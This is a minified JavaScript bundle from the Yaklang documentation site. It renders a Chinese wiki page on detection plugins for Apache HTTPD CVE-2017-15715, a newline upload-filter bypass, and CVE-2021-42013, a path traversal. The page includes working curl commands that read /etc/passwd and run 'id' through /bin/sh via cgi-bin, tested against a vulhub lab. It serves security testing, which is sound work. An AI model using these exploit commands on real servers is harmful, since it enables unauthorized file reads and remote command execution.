"use strict";(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[9144],{15680:(e,n,t)=>{t.d(n,{xA:()=>g,yg:()=>d});var r=t(96540);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function p(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?p(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):p(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function c(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},p=Object.keys(e);for(r=0;r<p.length;r++)t=p[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(r=0;r<p.length;r++)t=p[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),o=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},g=function(e){var n=o(e.components);return r.createElement(l.Provider,{value:n},e.children)},s="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},y=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,p=e.originalType,l=e.parentName,g=c(e,["components","mdxType","originalType","parentName"]),s=o(t),y=a,d=s["".concat(l,".").concat(y)]||s[y]||u[y]||p;return t?r.createElement(d,i(i({ref:n},g),{},{components:t})):r.createElement(d,i({ref:n},g))}));function d(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var p=t.length,i=new Array(p);i[0]=y;var c={};for(var l in n)hasOwnProperty.call(n,l)&&(c[l]=n[l]);c.originalType=e,c[s]="string"==typeof e?e:a,i[1]=c;for(var o=2;o<p;o++)i[o]=t[o];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}y.displayName="MDXCreateElement"},60402:(e,n,t)=>{t.r(n),t.d(n,{contentTitle:()=>i,default:()=>s,frontMatter:()=>p,metadata:()=>c,toc:()=>l});var r=t(58168),a=(t(96540),t(15680));const p={sidebar_position:14},i="Apache\u63d2\u4ef6\u4f7f\u7528",c={unversionedId:"wiki/DetectionPlug-in/Apache",id:"wiki/DetectionPlug-in/Apache",isDocsHomePage:!1,title:"Apache\u63d2\u4ef6\u4f7f\u7528",description:"1 CVE-2017-15715",source:"@site/Yaklab/wiki/DetectionPlug-in/Apache.md",sourceDirName:"wiki/DetectionPlug-in",slug:"/wiki/DetectionPlug-in/Apache",permalink:"/en/Yaklab/wiki/DetectionPlug-in/Apache",tags:[],version:"current",sidebarPosition:14,frontMatter:{sidebar_position:14},sidebar:"teamSidebar",previous:{title:"Thinkphp\u63d2\u4ef6\u4f7f\u7528",permalink:"/en/Yaklab/wiki/DetectionPlug-in/Thinkphp"},next:{title:"Jenkins\u63d2\u4ef6\u4f7f\u7528",permalink:"/en/Yaklab/wiki/DetectionPlug-in/Jenkins"}},l=[{value:"1 CVE-2017-15715",id:"1-cve-2017-15715",children:[]},{value:"2 CVE-2021-42013",id:"2-cve-2021-42013",children:[]}],o={toc:l},g="wrapper";function s(e){let{components:n,...p}=e;return(0,a.yg)(g,(0,r.A)({},o,p,{components:n,mdxType:"MDXLayout"}),(0,a.yg)("h1",{id:"apache\u63d2\u4ef6\u4f7f\u7528"},"Apache\u63d2\u4ef6\u4f7f\u7528"),(0,a.yg)("h2",{id:"1-cve-2017-15715"},"1 CVE-2017-15715"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"f7c170b3-77de-4af3-8551-6da4ce1bd471"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6f0f\u6d1e\u63cf\u8ff0\uff1a")),(0,a.yg)("p",null,"Apache HTTPD\u6362\u884c\u89e3\u6790\u6f0f\u6d1e\uff0cApache HTTPD\u662f\u4e00\u6b3eHTTP\u670d\u52a1\u5668\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7mod_php\u6765\u8fd0\u884cPHP\u7f51\u9875\u3002\u51762.4.0~2.4.29\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790PHP\u65f6\uff0c1.php\\x0A\u5c06\u88ab\u6309\u7167PHP\u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565\u3002"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"vulhub\u9776\u573a\u8bbf\u95ee\u6d4b\u8bd5\u7f51\u7ad9\uff0c\u4e0a\u4f20\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u88ab\u62e6\u622a"),(0,a.yg)("p",null,(0,a.yg)("img",{src:t(72738).A})),(0,a.yg)("p",null,"\u5728test.php\u540e\u9762\u63d2\u5165\u4e00\u4e2a\\x0A\uff0c\u6210\u529f\u4e0a\u4f20"),(0,a.yg)("p",null,(0,a.yg)("img",{src:t(12473).A})),(0,a.yg)("p",null,"\u8bbf\u95ee\u521a\u624d\u4e0a\u4f20\u7684/test.php%0A\uff0c\u53d1\u73b0\u80fd\u591f\u6210\u529f\u89e3\u6790"),(0,a.yg)("p",null,(0,a.yg)("img",{src:t(6224).A})),(0,a.yg)("h2",{id:"2-cve-2021-42013"},"2 CVE-2021-42013"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.yg)("p",null,"239d9646-1ca4-471e-a9b4-5ab0534f759b"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6f0f\u6d1e\u63cf\u8ff0\uff1a")),(0,a.yg)("p",null,"Apache HTTP Server 2.4.50 \u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8bfb\u53d6\u4f4d\u4e8eApache\u670d\u52a1\u5668Web\u76ee\u5f55\u4ee5\u5916\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6216\u8005\u8bfb\u53d6Web\u76ee\u5f55\u4e2d\u7684\u811a\u672c\u6587\u4ef6\u6e90\u7801\uff0c\u6216\u8005\u5728\u5f00\u542f\u4e86cgi\u6216cgid\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002"),(0,a.yg)("p",null,(0,a.yg)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.yg)("p",null,"vulhub\u9776\u573a\u8bbf\u95ee\u6d4b\u8bd5\u7f51\u7ad9\uff0c\u4f7f\u7528.%%32%65\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u6210\u529f\u8bfb\u53d6\u5230/etc/passwd"),(0,a.yg)("pre",null,(0,a.yg)("code",{parentName:"pre",className:"language-go"},"curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\n")),(0,a.yg)("p",null,(0,a.yg)("img",{src:t(18447).A})),(0,a.yg)("p",null,"\u5728\u670d\u52a1\u7aef\u5f00\u542f\u4e86cgi\u6216cgid\u8fd9\u4e24\u4e2amod\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u5c06\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4"),(0,a.yg)("pre",null,(0,a.yg)("code",{parentName:"pre",className:"language-go"},"curl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'\n")),(0,a.yg)("p",null,(0,a.yg)("img",{src:t(79430).A})))}s.isMDXComponent=!0},72738:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/apache-1-9c401930c404da6c3681da4220b5d3cf.png"},12473:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/apache-2-edda0756cf3797d01232f0eaaccf9399.png"},6224:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/apache-3-07f4694b93a3bb9dde9d8ab09e4fc6e3.png"},18447:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/apache-4-d9b3f924e700456aaaf282406b00236a.png"},79430:(e,n,t)=>{t.d(n,{A:()=>r});const r=t.p+"assets/images/apache-5-46080223bee7c549371e31189920ada2.png"}}]);